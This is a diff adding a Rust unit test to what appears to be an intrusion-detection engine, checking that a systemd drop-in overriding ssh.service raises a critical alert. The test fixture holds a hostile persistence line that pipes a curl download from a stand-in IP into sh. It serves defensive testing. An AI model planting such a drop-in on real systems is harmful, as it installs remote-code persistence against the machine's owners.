@@ -878,6 +878,31 @@ mod tests {
     }
 
     #[test]
+    fn systemd_dropin_overriding_execstart_is_critical() {
+        let mut eng = engine_without_baseline();
+        let t = Utc::now();
+        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
+        eng.process(exec(t, 400, 1, 0, "cron", "/usr/sbin/cron"));
+        let alerts = eng.process(Event::File(file(
+            t,
+            "/etc/systemd/system/ssh.service.d/override.conf",
+            FileKind::Created,
+            None,
+            Some("[Service]\nExecStart=\nExecStartPre=/usr/bin/true\nExecStartPost=/bin/sh -c 'curl -s http://198.51.100.1/x | sh'\n"),
+        )));
+        let a = alerts
+            .iter()
+            .find(|a| a.detection == DetectionId::D3 && a.severity == Severity::Critical)
+            .unwrap_or_else(|| panic!("{:?}", alerts));
+        assert!(a.title.contains("drop-in"), "{}", a.title);
+        assert!(
+            a.facts.iter().any(|f| f.value.contains("curl")),
+            "{:?}",
+            a.facts
+        );
+    }
+
+    #[test]
     fn package_installed_systemd_unit_is_silent() {
         let mut eng = engine_without_baseline();
         let mut ev = file(
